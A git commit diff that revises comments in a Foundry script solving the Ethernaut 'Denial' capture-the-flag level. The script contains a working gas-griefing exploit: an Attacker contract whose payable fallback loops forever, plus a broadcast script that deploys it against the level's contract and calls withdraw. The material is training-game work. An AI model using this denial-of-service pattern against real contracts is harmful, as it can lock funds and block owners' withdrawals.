b4812e29a4c6def8fcbcb5269c32461cf21a6c13
Alexander Gadzhalov <alexander.gadzhalov@limechain.tech>
2024-11-08 14:48:28 +0200

    docs(Denial): style guide and comments

--- script/Denial.s.sol
+++ script/Denial.s.sol
@@ -7,13 +7,11 @@ import {Denial} from "../src/Denial.sol";
 contract Attacker {
     
     constructor(Denial denial) {
-        //denial = Denial(payable(_denialAddress));
         denial.setWithdrawPartner(address(this));
     }
 
-    // fallback because 
-    // payable because it must accept funds
-    fallback() external payable {
+    // Fallback function that runs an infinite loop to consume all gas
+    fallback() external payable { // payable because it must accept funds
         while (true) {
 
         }
@@ -21,17 +19,23 @@ contract Attacker {
 
 }
 
+/// @author agadzhalov
+/// @title Solution to Denial Ethernaut challenge
+/// @notice Solution: We can provide a smart contract that consumes all the gas, making it impossible 
+///         to continue sending funds to the owner. This can be done through an infinite loop.
 contract DenialScript is Script {
 
     Denial private denial = Denial(payable(0xcE1Ab02DBc8bD372aA60015b6212cDf2e2fb9853));
-    /**
-     * Solution: we can provide a smart contract that consumes all the gas and making it impossible to continue
-     * to sending the funds to the owner. This can be done through infinite loop.
-     */
+    
     function run() public {
         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
+
+        // Deploy the Attacker contract with the Denial contract as parameter
         Attacker attacker = new Attacker(denial);
+        
+        // Call the withdraw function on the Denial contract
         denial.withdraw();
+
         vm.stopBroadcast();
     }
 }
